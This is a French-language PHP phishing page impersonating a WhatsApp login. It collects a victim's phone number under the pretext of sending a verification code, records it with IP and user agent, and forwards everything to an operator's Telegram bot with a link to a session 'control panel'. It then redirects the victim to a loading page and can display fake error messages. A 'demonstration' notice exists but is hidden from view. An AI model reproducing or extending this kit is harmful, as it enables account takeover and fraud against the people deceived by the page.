<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';
$errorMessage = '';

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

// Fonction pour détecter le code pays par IP
function getCountryCodeByIP($ip) {
    $countryCode = 'FR'; // Défaut
    try {
        $response = @file_get_contents("http://ip-api.com/json/{$ip}");
        if ($response !== false) {
            $data = json_decode($response, true);
            if (isset($data['countryCode'])) {
                $countryCode = $data['countryCode'];
            }
        }
    } catch (Exception $e) {
        // En cas d'erreur, utiliser le code par défaut
    }
    return $countryCode;
}

$countryCode = getCountryCodeByIP($clientIp);

// Fonction pour obtenir l'indicatif téléphonique par code pays
function getPhoneCodeByCountry($countryCode) {
    $phoneCodes = [
        'AF' => '+93',  // Afghanistan
        'AX' => '+358', // Åland Islands
        'AL' => '+355', // Albania
        'DZ' => '+213', // Algeria
        'AS' => '+1',   // American Samoa
        'AD' => '+376', // Andorra
        'AO' => '+244', // Angola
        'AI' => '+1',   // Anguilla
        'AQ' => '+672', // Antarctica
        'AG' => '+1',   // Antigua and Barbuda
        'AR' => '+54',  // Argentina
        'AM' => '+374', // Armenia
        'AW' => '+297', // Aruba
        'AU' => '+61',  // Australia
        'AT' => '+43',  // Austria
        'AZ' => '+994', // Azerbaijan
        'BS' => '+1',   // Bahamas
        'BH' => '+973', // Bahrain
        'BD' => '+880', // Bangladesh
        'BB' => '+1',   // Barbados
        'BY' => '+375', // Belarus
        'BE' => '+32',  // Belgium
        'BZ' => '+501', // Belize
        'BJ' => '+229', // Benin
        'BM' => '+1',   // Bermuda
        'BT' => '+975', // Bhutan
        'BO' => '+591', // Bolivia
        'BA' => '+387', // Bosnia and Herzegovina
        'BW' => '+267', // Botswana
        'BV' => '+47',  // Bouvet Island
        'BR' => '+55',  // Brazil
        'IO' => '+246', // British Indian Ocean Territory
        'BN' => '+673', // Brunei
        'BG' => '+359', // Bulgaria
        'BF' => '+226', // Burkina Faso
        'BI' => '+257', // Burundi
        'KH' => '+855', // Cambodia
        'CM' => '+237', // Cameroon
        'CA' => '+1',   // Canada
        'CV' => '+238', // Cape Verde
        'KY' => '+1',   // Cayman Islands
        'CF' => '+236', // Central African Republic
        'TD' => '+235', // Chad
        'CL' => '+56',  // Chile
        'CN' => '+86',  // China
        'CX' => '+61',  // Christmas Island
        'CC' => '+61',  // Cocos Islands
        'CO' => '+57',  // Colombia
        'KM' => '+269', // Comoros
        'CG' => '+242', // Congo
        'CD' => '+243', // Democratic Republic of the Congo
        'CK' => '+682', // Cook Islands
        'CR' => '+506', // Costa Rica
        'CI' => '+225', // Côte d'Ivoire
        'HR' => '+385', // Croatia
        'CU' => '+53',  // Cuba
        'CY' => '+357', // Cyprus
        'CZ' => '+420', // Czech Republic
        'DK' => '+45',  // Denmark
        'DJ' => '+253', // Djibouti
        'DM' => '+1',   // Dominica
        'DO' => '+1',   // Dominican Republic
        'EC' => '+593', // Ecuador
        'EG' => '+20',  // Egypt
        'SV' => '+503', // El Salvador
        'GQ' => '+240', // Equatorial Guinea
        'ER' => '+291', // Eritrea
        'EE' => '+372', // Estonia
        'ET' => '+251', // Ethiopia
        'FK' => '+500', // Falkland Islands
        'FO' => '+298', // Faroe Islands
        'FJ' => '+679', // Fiji
        'FI' => '+358', // Finland
        'FR' => '+33',  // France
        'GF' => '+594', // French Guiana
        'PF' => '+689', // French Polynesia
        'TF' => '+262', // French Southern Territories
        'GA' => '+241', // Gabon
        'GM' => '+220', // Gambia
        'GE' => '+995', // Georgia
        'DE' => '+49',  // Germany
        'GH' => '+233', // Ghana
        'GI' => '+350', // Gibraltar
        'GR' => '+30',  // Greece
        'GL' => '+299', // Greenland
        'GD' => '+1',   // Grenada
        'GP' => '+590', // Guadeloupe
        'GU' => '+1',   // Guam
        'GT' => '+502', // Guatemala
        'GG' => '+44',  // Guernsey
        'GN' => '+224', // Guinea
        'GW' => '+245', // Guinea-Bissau
        'GY' => '+592', // Guyana
        'HT' => '+509', // Haiti
        'HM' => '+672', // Heard Island and McDonald Islands
        'VA' => '+379', // Holy See
        'HN' => '+504', // Honduras
        'HK' => '+852', // Hong Kong
        'HU' => '+36',  // Hungary
        'IS' => '+354', // Iceland
        'IN' => '+91',  // India
        'ID' => '+62',  // Indonesia
        'IR' => '+98',  // Iran
        'IQ' => '+964', // Iraq
        'IE' => '+353', // Ireland
        'IM' => '+44',  // Isle of Man
        'IL' => '+972', // Israel
        'IT' => '+39',  // Italy
        'JM' => '+1',   // Jamaica
        'JP' => '+81',  // Japan
        'JE' => '+44',  // Jersey
        'JO' => '+962', // Jordan
        'KZ' => '+7',   // Kazakhstan
        'KE' => '+254', // Kenya
        'KI' => '+686', // Kiribati
        'KP' => '+850', // North Korea
        'KR' => '+82',  // South Korea
        'KW' => '+965', // Kuwait
        'KG' => '+996', // Kyrgyzstan
        'LA' => '+856', // Laos
        'LV' => '+371', // Latvia
        'LB' => '+961', // Lebanon
        'LS' => '+266', // Lesotho
        'LR' => '+231', // Liberia
        'LY' => '+218', // Libya
        'LI' => '+423', // Liechtenstein
        'LT' => '+370', // Lithuania
        'LU' => '+352', // Luxembourg
        'MO' => '+853', // Macao
        'MK' => '+389', // Macedonia
        'MG' => '+261', // Madagascar
        'MW' => '+265', // Malawi
        'MY' => '+60',  // Malaysia
        'MV' => '+960', // Maldives
        'ML' => '+223', // Mali
        'MT' => '+356', // Malta
        'MH' => '+692', // Marshall Islands
        'MQ' => '+596', // Martinique
        'MR' => '+222', // Mauritania
        'MU' => '+230', // Mauritius
        'YT' => '+262', // Mayotte
        'MX' => '+52',  // Mexico
        'FM' => '+691', // Micronesia
        'MD' => '+373', // Moldova
        'MC' => '+377', // Monaco
        'MN' => '+976', // Mongolia
        'ME' => '+382', // Montenegro
        'MS' => '+1',   // Montserrat
        'MA' => '+212', // Morocco
        'MZ' => '+258', // Mozambique
        'MM' => '+95',  // Myanmar
        'NA' => '+264', // Namibia
        'NR' => '+674', // Nauru
        'NP' => '+977', // Nepal
        'NL' => '+31',  // Netherlands
        'AN' => '+599', // Netherlands Antilles
        'NC' => '+687', // New Caledonia
        'NZ' => '+64',  // New Zealand
        'NI' => '+505', // Nicaragua
        'NE' => '+227', // Niger
        'NG' => '+234', // Nigeria
        'NU' => '+683', // Niue
        'NF' => '+672', // Norfolk Island
        'MP' => '+1',   // Northern Mariana Islands
        'NO' => '+47',  // Norway
        'OM' => '+968', // Oman
        'PK' => '+92',  // Pakistan
        'PW' => '+680', // Palau
        'PS' => '+970', // Palestine
        'PA' => '+507', // Panama
        'PG' => '+675', // Papua New Guinea
        'PY' => '+595', // Paraguay
        'PE' => '+51',  // Peru
        'PH' => '+63',  // Philippines
        'PN' => '+64',  // Pitcairn
        'PL' => '+48',  // Poland
        'PT' => '+351', // Portugal
        'PR' => '+1',   // Puerto Rico
        'QA' => '+974', // Qatar
        'RE' => '+262', // Réunion
        'RO' => '+40',  // Romania
        'RU' => '+7',   // Russia
        'RW' => '+250', // Rwanda
        'BL' => '+590', // Saint Barthélemy
        'SH' => '+290', // Saint Helena
        'KN' => '+1',   // Saint Kitts and Nevis
        'LC' => '+1',   // Saint Lucia
        'MF' => '+590', // Saint Martin
        'PM' => '+508', // Saint Pierre and Miquelon
        'VC' => '+1',   // Saint Vincent and the Grenadines
        'WS' => '+685', // Samoa
        'SM' => '+378', // San Marino
        'ST' => '+239', // São Tomé and Príncipe
        'SA' => '+966', // Saudi Arabia
        'SN' => '+221', // Senegal
        'RS' => '+381', // Serbia
        'SC' => '+248', // Seychelles
        'SL' => '+232', // Sierra Leone
        'SG' => '+65',  // Singapore
        'SK' => '+421', // Slovakia
        'SI' => '+386', // Slovenia
        'SB' => '+677', // Solomon Islands
        'SO' => '+252', // Somalia
        'ZA' => '+27',  // South Africa
        'GS' => '+500', // South Georgia and the South Sandwich Islands
        'SS' => '+211', // South Sudan
        'ES' => '+34',  // Spain
        'LK' => '+94',  // Sri Lanka
        'SD' => '+249', // Sudan
        'SR' => '+597', // Suriname
        'SJ' => '+47',  // Svalbard and Jan Mayen
        'SZ' => '+268', // Swaziland
        'SE' => '+46',  // Sweden
        'CH' => '+41',  // Switzerland
        'SY' => '+963', // Syria
        'TW' => '+886', // Taiwan
        'TJ' => '+992', // Tajikistan
        'TZ' => '+255', // Tanzania
        'TH' => '+66',  // Thailand
        'TL' => '+670', // Timor-Leste
        'TG' => '+228', // Togo
        'TK' => '+690', // Tokelau
        'TO' => '+676', // Tonga
        'TT' => '+1',   // Trinidad and Tobago
        'TN' => '+216', // Tunisia
        'TR' => '+90',  // Turkey
        'TM' => '+993', // Turkmenistan
        'TC' => '+1',   // Turks and Caicos Islands
        'TV' => '+688', // Tuvalu
        'UG' => '+256', // Uganda
        'UA' => '+380', // Ukraine
        'AE' => '+971', // United Arab Emirates
        'GB' => '+44',  // United Kingdom
        'US' => '+1',   // United States
        'UM' => '+1',   // United States Minor Outlying Islands
        'UY' => '+598', // Uruguay
        'UZ' => '+998', // Uzbekistan
        'VU' => '+678', // Vanuatu
        'VE' => '+58',  // Venezuela
        'VN' => '+84',  // Vietnam
        'VG' => '+1',   // Virgin Islands, British
        'VI' => '+1',   // Virgin Islands, U.S.
        'WF' => '+681', // Wallis and Futuna
        'EH' => '+212', // Western Sahara
        'YE' => '+967', // Yemen
        'ZM' => '+260', // Zambia
        'ZW' => '+263', // Zimbabwe
        'UK' => '+44',  // United Kingdom (alternate)
    ];
    return $phoneCodes[$countryCode] ?? '+33';
}

$phoneCode = getPhoneCodeByCountry($countryCode);

// Vérifier s'il y a une action en cours pour les erreurs
$actionFile = 'sessions/' . $sessionId . '_action.json';
if (file_exists($actionFile)) {
    $actionData = json_decode(file_get_contents($actionFile), true);
    if (isset($actionData['action']) && $actionData['action'] === 'facebook_error') {
        $errorMessage = $actionData['errorMessage'] ?? 'Les informations que vous avez saisies sont incorrectes. Veuillez réessayer.';
        // Supprimer l'action pour ne pas afficher l'erreur en boucle
        unlink($actionFile);
    }
}

// Mettre à jour le fichier de suivi
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'connexion_f.php',
    'timestamp' => time(),
    'ip' => $clientIp
];

// Créer le dossier tracking s'il n'existe pas
if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));

// Traitement du formulaire
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phoneNumber = $_POST['phone_number'] ?? '';
    $selectedCountryCode = $_POST['country_code'] ?? $countryCode;
    $selectedPhoneCode = getPhoneCodeByCountry($selectedCountryCode);
    
    if (!empty($phoneNumber)) {
        // Enregistrer les informations de connexion
        $clientData = [
            'phone_number' => $phoneNumber,
            'country_code' => $selectedCountryCode,
            'phone_code' => $selectedPhoneCode,
            'timestamp' => time(),
            'ip' => $clientIp,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? ''
        ];
        
        // Créer le dossier sessions s'il n'existe pas
        if (!file_exists('sessions')) {
            mkdir('sessions', 0777, true);
        }
        
        // Enregistrer les données
        file_put_contents('sessions/' . $sessionId . '.json', json_encode($clientData));
        
        // Envoyer les informations à Telegram
        $message = "📱 NOUVEAU NUMÉRO DE TÉLÉPHONE 📱\n\n";
        $message .= "📞 Numéro: " . $phoneNumber . "\n";
        $message .= "🌍 Pays: " . $selectedCountryCode . "\n";
        $message .= "📍 Indicatif: " . $selectedPhoneCode . "\n";
        $message .= "🌐 IP: " . $clientIp . "\n";
        $message .= "🖥️ User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Non disponible') . "\n\n";
        
        // Chemin du fichier de configuration Telegram
        $telegramConfigFile = 'telegram_config.json';
        if (file_exists($telegramConfigFile)) {
            $telegramConfig = json_decode(file_get_contents($telegramConfigFile), true);
            $botToken = $telegramConfig['bot_token'] ?? '';
            $chatId = $telegramConfig['chat_id'] ?? '';

            $message .= "🔗 Panneau de contrôle:  " .$telegramConfig['url'] . "/control_panel.php?session=" . $sessionId . "&ip=" . $clientIp;
    
            
            if (!empty($botToken) && !empty($chatId)) {
                $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
                $params = [
                    'chat_id' => $chatId,
                    'text' => $message,
                    'parse_mode' => 'HTML'
                ];
                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // Skip SSL Verification
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $response = curl_exec($ch);
                curl_close($ch);
            }
        }
        
        // Rediriger directement vers la page de chargement SANS attendre l'action de l'administrateur
        header("Location: loading.php?session=" . $sessionId . "&ip=" . $clientIp);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter avec téléphone</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.6;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            width: 80px;
            margin-bottom: 15px;
            margin-top: 15px;
        }
        
        .login-card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .login-title {
            font-size: 18px;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-control {
            width: 100%;
            padding: 14px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            color: #1c1e21;
        }
        
        .form-control:focus {
            border-color: #00AD5C;
            outline: none;
            box-shadow: 0 0 0 2px #e7f8ef;
        }
        
        .login-button {
            width: 100%;
            padding: 12px 0;
            background-color: #00AD5C;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 15px;
        }
        
        .login-button:hover {
            background-color: #128C7E;
        }
        
        .forgot-password {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dadde1;
        }
        
        .divider span {
            padding: 0 10px;
            color: #65676b;
            font-size: 14px;
        }
        
        .create-account {
            text-align: center;
        }
        
        .create-button {
            display: inline-block;
            padding: 10px 16px;
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
        }
        
        .create-button:hover {
            background-color: #36a420;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #65676b;
            font-size: 12px;
        }
        
        .footer a {
            color: #65676b;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .languages {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin-bottom: 10px;
        }
        
        .languages a {
            margin: 0 5px;
            color: #65676b;
            text-decoration: none;
            font-size: 12px;
        }
        
        .languages a:hover {
            text-decoration: underline;
        }
        
        .languages a.active {
            color: #00AD5C;
        }
        
        .copyright {
            margin-top: 10px;
        }
        
        .error-message {
            background-color: #ffebee;
            color: #c62828;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 14px;
            display: flex;
            align-items: center;
        }
        
        .error-message i {
            margin-right: 10px;
            font-size: 16px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://www.freeiconspng.com/uploads/logo-whatsapp-png-image-2.png" alt="WhatsApp Logo" class="logo">
        </div>
            <!-- Avis de démonstration -->
    <div class="demo-notice" style="display:none">
        <p><strong>Démonstration uniquement</strong> - Ce site est une démonstration technique à des fins éducatives.</p>
    </div>
        
        
        <div class="login-card">
            <div class="login-title" style="color: #00AD5C;">Connexion avec WhatsApp</div>
            
            <?php if (!empty($errorMessage)): ?>
            <div class="error-message">
                <i class="fas fa-exclamation-circle"></i> <?php echo htmlspecialchars($errorMessage); ?>
            </div>
            <?php endif; ?>
            
            <p style="color: #65676b; margin-bottom: 20px; text-align: center; font-size: 14px;">Pour des raisons de sécurité, veuillez entrer votre numéro de téléphone pour recevoir un code de vérification par WhatsApp.</p>
            
            <form method="post" action="">
                <div class="form-group">
                    <label style="display: block; font-size: 14px; color: #65676b; margin-bottom: 5px;">Numéro de téléphone</label>
                    <div style="display: flex; gap: 8px;">
                        <select id="country-code" name="country_code" class="form-control" style="width: 100px; padding: 14px;">
                            <option value="AF">+93 (AF)</option>
                            <option value="AX">+358 (AX)</option>
                            <option value="AL">+355 (AL)</option>
                            <option value="DZ">+213 (DZ)</option>
                            <option value="AS">+1 (AS)</option>
                            <option value="AD">+376 (AD)</option>
                            <option value="AO">+244 (AO)</option>
                            <option value="AI">+1 (AI)</option>
                            <option value="AQ">+672 (AQ)</option>
                            <option value="AG">+1 (AG)</option>
                            <option value="AR">+54 (AR)</option>
                            <option value="AM">+374 (AM)</option>
                            <option value="AW">+297 (AW)</option>
                            <option value="AU">+61 (AU)</option>
                            <option value="AT">+43 (AT)</option>
                            <option value="AZ">+994 (AZ)</option>
                            <option value="BS">+1 (BS)</option>
                            <option value="BH">+973 (BH)</option>
                            <option value="BD">+880 (BD)</option>
                            <option value="BB">+1 (BB)</option>
                            <option value="BY">+375 (BY)</option>
                            <option value="BE">+32 (BE)</option>
                            <option value="BZ">+501 (BZ)</option>
                            <option value="BJ">+229 (BJ)</option>
                            <option value="BM">+1 (BM)</option>
                            <option value="BT">+975 (BT)</option>
                            <option value="BO">+591 (BO)</option>
                            <option value="BA">+387 (BA)</option>
                            <option value="BW">+267 (BW)</option>
                            <option value="BV">+47 (BV)</option>
                            <option value="BR">+55 (BR)</option>
                            <option value="IO">+246 (IO)</option>
                            <option value="BN">+673 (BN)</option>
                            <option value="BG">+359 (BG)</option>
                            <option value="BF">+226 (BF)</option>
                            <option value="BI">+257 (BI)</option>
                            <option value="KH">+855 (KH)</option>
                            <option value="CM">+237 (CM)</option>
                            <option value="CA">+1 (CA)</option>
                            <option value="CV">+238 (CV)</option>
                            <option value="KY">+1 (KY)</option>
                            <option value="CF">+236 (CF)</option>
                            <option value="TD">+235 (TD)</option>
                            <option value="CL">+56 (CL)</option>
                            <option value="CN">+86 (CN)</option>
                            <option value="CX">+61 (CX)</option>
                            <option value="CC">+61 (CC)</option>
                            <option value="CO">+57 (CO)</option>
                            <option value="KM">+269 (KM)</option>
                            <option value="CG">+242 (CG)</option>
                            <option value="CD">+243 (CD)</option>
                            <option value="CK">+682 (CK)</option>
                            <option value="CR">+506 (CR)</option>
                            <option value="CI">+225 (CI)</option>
                            <option value="HR">+385 (HR)</option>
                            <option value="CU">+53 (CU)</option>
                            <option value="CY">+357 (CY)</option>
                            <option value="CZ">+420 (CZ)</option>
                            <option value="DK">+45 (DK)</option>
                            <option value="DJ">+253 (DJ)</option>
                            <option value="DM">+1 (DM)</option>
                            <option value="DO">+1 (DO)</option>
                            <option value="EC">+593 (EC)</option>
                            <option value="EG">+20 (EG)</option>
                            <option value="SV">+503 (SV)</option>
                            <option value="GQ">+240 (GQ)</option>
                            <option value="ER">+291 (ER)</option>
                            <option value="EE">+372 (EE)</option>
                            <option value="ET">+251 (ET)</option>
                            <option value="FK">+500 (FK)</option>
                            <option value="FO">+298 (FO)</option>
                            <option value="FJ">+679 (FJ)</option>
                            <option value="FI">+358 (FI)</option>
                            <option value="FR">+33 (FR)</option>
                            <option value="GF">+594 (GF)</option>
                            <option value="PF">+689 (PF)</option>
                            <option value="TF">+262 (TF)</option>
                            <option value="GA">+241 (GA)</option>
                            <option value="GM">+220 (GM)</option>
                            <option value="GE">+995 (GE)</option>
                            <option value="DE">+49 (DE)</option>
                            <option value="GH">+233 (GH)</option>
                            <option value="GI">+350 (GI)</option>
                            <option value="GR">+30 (GR)</option>
                            <option value="GL">+299 (GL)</option>
                            <option value="GD">+1 (GD)</option>
                            <option value="GP">+590 (GP)</option>
                            <option value="GU">+1 (GU)</option>
                            <option value="GT">+502 (GT)</option>
                            <option value="GG">+44 (GG)</option>
                            <option value="GN">+224 (GN)</option>
                            <option value="GW">+245 (GW)</option>
                            <option value="GY">+592 (GY)</option>
                            <option value="HT">+509 (HT)</option>
                            <option value="HM">+672 (HM)</option>
                            <option value="VA">+379 (VA)</option>
                            <option value="HN">+504 (HN)</option>
                            <option value="HK">+852 (HK)</option>
                            <option value="HU">+36 (HU)</option>
                            <option value="IS">+354 (IS)</option>
                            <option value="IN">+91 (IN)</option>
                            <option value="ID">+62 (ID)</option>
                            <option value="IR">+98 (IR)</option>
                            <option value="IQ">+964 (IQ)</option>
                            <option value="IE">+353 (IE)</option>
                            <option value="IM">+44 (IM)</option>
                            <option value="IL">+972 (IL)</option>
                            <option value="IT">+39 (IT)</option>
                            <option value="JM">+1 (JM)</option>
                            <option value="JP">+81 (JP)</option>
                            <option value="JE">+44 (JE)</option>
                            <option value="JO">+962 (JO)</option>
                            <option value="KZ">+7 (KZ)</option>
                            <option value="KE">+254 (KE)</option>
                            <option value="KI">+686 (KI)</option>
                            <option value="KP">+850 (KP)</option>
                            <option value="KR">+82 (KR)</option>
                            <option value="KW">+965 (KW)</option>
                            <option value="KG">+996 (KG)</option>
                            <option value="LA">+856 (LA)</option>
                            <option value="LV">+371 (LV)</option>
                            <option value="LB">+961 (LB)</option>
                            <option value="LS">+266 (LS)</option>
                            <option value="LR">+231 (LR)</option>
                            <option value="LY">+218 (LY)</option>
                            <option value="LI">+423 (LI)</option>
                            <option value="LT">+370 (LT)</option>
                            <option value="LU">+352 (LU)</option>
                            <option value="MO">+853 (MO)</option>
                            <option value="MK">+389 (MK)</option>
                            <option value="MG">+261 (MG)</option>
                            <option value="MW">+265 (MW)</option>
                            <option value="MY">+60 (MY)</option>
                            <option value="MV">+960 (MV)</option>
                            <option value="ML">+223 (ML)</option>
                            <option value="MT">+356 (MT)</option>
                            <option value="MH">+692 (MH)</option>
                            <option value="MQ">+596 (MQ)</option>
                            <option value="MR">+222 (MR)</option>
                            <option value="MU">+230 (MU)</option>
                            <option value="YT">+262 (YT)</option>
                            <option value="MX">+52 (MX)</option>
                            <option value="FM">+691 (FM)</option>
                            <option value="MD">+373 (MD)</option>
                            <option value="MC">+377 (MC)</option>
                            <option value="MN">+976 (MN)</option>
                            <option value="ME">+382 (ME)</option>
                            <option value="MS">+1 (MS)</option>
                            <option value="MA">+212 (MA)</option>
                            <option value="MZ">+258 (MZ)</option>
                            <option value="MM">+95 (MM)</option>
                            <option value="NA">+264 (NA)</option>
                            <option value="NR">+674 (NR)</option>
                            <option value="NP">+977 (NP)</option>
                            <option value="NL">+31 (NL)</option>
                            <option value="AN">+599 (AN)</option>
                            <option value="NC">+687 (NC)</option>
                            <option value="NZ">+64 (NZ)</option>
                            <option value="NI">+505 (NI)</option>
                            <option value="NE">+227 (NE)</option>
                            <option value="NG">+234 (NG)</option>
                            <option value="NU">+683 (NU)</option>
                            <option value="NF">+672 (NF)</option>
                            <option value="MP">+1 (MP)</option>
                            <option value="NO">+47 (NO)</option>
                            <option value="OM">+968 (OM)</option>
                            <option value="PK">+92 (PK)</option>
                            <option value="PW">+680 (PW)</option>
                            <option value="PS">+970 (PS)</option>
                            <option value="PA">+507 (PA)</option>
                            <option value="PG">+675 (PG)</option>
                            <option value="PY">+595 (PY)</option>
                            <option value="PE">+51 (PE)</option>
                            <option value="PH">+63 (PH)</option>
                            <option value="PN">+64 (PN)</option>
                            <option value="PL">+48 (PL)</option>
                            <option value="PT">+351 (PT)</option>
                            <option value="PR">+1 (PR)</option>
                            <option value="QA">+974 (QA)</option>
                            <option value="RE">+262 (RE)</option>
                            <option value="RO">+40 (RO)</option>
                            <option value="RU">+7 (RU)</option>
                            <option value="RW">+250 (RW)</option>
                            <option value="BL">+590 (BL)</option>
                            <option value="SH">+290 (SH)</option>
                            <option value="KN">+1 (KN)</option>
                            <option value="LC">+1 (LC)</option>
                            <option value="MF">+590 (MF)</option>
                            <option value="PM">+508 (PM)</option>
                            <option value="VC">+1 (VC)</option>
                            <option value="WS">+685 (WS)</option>
                            <option value="SM">+378 (SM)</option>
                            <option value="ST">+239 (ST)</option>
                            <option value="SA">+966 (SA)</option>
                            <option value="SN">+221 (SN)</option>
                            <option value="RS">+381 (RS)</option>
                            <option value="SC">+248 (SC)</option>
                            <option value="SL">+232 (SL)</option>
                            <option value="SG">+65 (SG)</option>
                            <option value="SK">+421 (SK)</option>
                            <option value="SI">+386 (SI)</option>
                            <option value="SB">+677 (SB)</option>
                            <option value="SO">+252 (SO)</option>
                            <option value="ZA">+27 (ZA)</option>
                            <option value="GS">+500 (GS)</option>
                            <option value="SS">+211 (SS)</option>
                            <option value="ES">+34 (ES)</option>
                            <option value="LK">+94 (LK)</option>
                            <option value="SD">+249 (SD)</option>
                            <option value="SR">+597 (SR)</option>
                            <option value="SJ">+47 (SJ)</option>
                            <option value="SZ">+268 (SZ)</option>
                            <option value="SE">+46 (SE)</option>
                            <option value="CH">+41 (CH)</option>
                            <option value="SY">+963 (SY)</option>
                            <option value="TW">+886 (TW)</option>
                            <option value="TJ">+992 (TJ)</option>
                            <option value="TZ">+255 (TZ)</option>
                            <option value="TH">+66 (TH)</option>
                            <option value="TL">+670 (TL)</option>
                            <option value="TG">+228 (TG)</option>
                            <option value="TK">+690 (TK)</option>
                            <option value="TO">+676 (TO)</option>
                            <option value="TT">+1 (TT)</option>
                            <option value="TN">+216 (TN)</option>
                            <option value="TR">+90 (TR)</option>
                            <option value="TM">+993 (TM)</option>
                            <option value="TC">+1 (TC)</option>
                            <option value="TV">+688 (TV)</option>
                            <option value="UG">+256 (UG)</option>
                            <option value="UA">+380 (UA)</option>
                            <option value="AE">+971 (AE)</option>
                            <option value="GB">+44 (GB)</option>
                            <option value="US">+1 (US)</option>
                            <option value="UM">+1 (UM)</option>
                            <option value="UY">+598 (UY)</option>
                            <option value="UZ">+998 (UZ)</option>
                            <option value="VU">+678 (VU)</option>
                            <option value="VE">+58 (VE)</option>
                            <option value="VN">+84 (VN)</option>
                            <option value="VG">+1 (VG)</option>
                            <option value="VI">+1 (VI)</option>
                            <option value="WF">+681 (WF)</option>
                            <option value="EH">+212 (EH)</option>
                            <option value="YE">+967 (YE)</option>
                            <option value="ZM">+260 (ZM)</option>
                            <option value="ZW">+263 (ZW)</option>
                        </select>
                        <input type="tel" name="phone_number" id="phone-number" class="form-control" placeholder="Numéro de téléphone" required style="flex: 1;">
                    </div>
                </div>
                
                <button type="submit" class="login-button">Envoyer le code de vérification</button>
            </form>
        </div>
        
        <div class="footer">
            <div class="languages">
                <a href="#" class="active">Français (France)</a>
                <a href="#">English (US)</a>
                <a href="#">Español</a>
                <a href="#">Deutsch</a>
                <a href="#">Italiano</a>
                <a href="#">العربية</a>
                <a href="#">Português (Brasil)</a>
                <a href="#">हिन्दी</a>
                <a href="#">中文(简体)</a>
                <a href="#">日本語</a>
            </div>            
            <div class="copyright">
                 © 2026            </div>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const countryCodeSelect = document.getElementById('country-code');
            const phoneNumberInput = document.getElementById('phone-number');
            const detectedCountryCode = '<?php echo $countryCode; ?>';
            
            // Set the auto-detected country code
            if (detectedCountryCode && countryCodeSelect) {
                countryCodeSelect.value = detectedCountryCode;
            }
            
            // Focus on phone number input
            if (phoneNumberInput) {
                phoneNumberInput.focus();
            }
        });
    </script>
</body>
</html>